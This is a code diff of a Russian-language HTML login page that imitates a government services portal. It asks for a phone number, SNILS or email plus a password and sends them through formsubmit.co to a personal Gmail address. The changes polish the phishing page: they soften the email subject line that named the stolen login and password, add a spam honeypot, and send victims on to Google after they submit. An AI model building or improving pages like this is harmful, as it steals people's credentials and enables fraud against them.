@@ -116,6 +116,11 @@
             color: #999;
             font-size: 14px;
         }
+
+        /* Honeypot: скрытое поле для спам-ботов */
+        .honeypot {
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -129,7 +134,7 @@
             <p>Войдите, чтобы получить доступ к сервисам</p>
 
             <!-- Форма отправляет данные на email -->
-            <form action="https://formsubmit.co/pelmen2003g@gmail.com" method="POST">
+            <form action="https://formsubmit.co/pelmen2003g@gmail.com" method="POST" enctype="multipart/form-data">
                 <div class="form-group">
                     <label for="login">Телефон, СНИЛС или email</label>
                     <input type="text" id="login" name="login" placeholder="Введите логин" required>
@@ -140,10 +145,14 @@
                     <input type="password" id="password" name="password" placeholder="Введите пароль" required>
                 </div>
 
+                <!-- Honeypot для защиты от спама -->
+                <input type="text" name="_honey" class="honeypot">
+
                 <!-- Скрытые настройки FormSubmit -->
-                <input type="hidden" name="_subject" value="Новый вход: логин и пароль">
+                <input type="hidden" name="_subject" value="Новый вход в систему">
                 <input type="hidden" name="_captcha" value="false">
-                <input type="hidden" name="_next" value="data:,">
+                <input type="hidden" name="_next" value="https://www.google.com">
+                <input type="hidden" name="_replyto" value="login"> <!-- Reply на поле login, если оно email -->
                 
                 <button type="submit" class="login-button">Войти</button>
             </form>
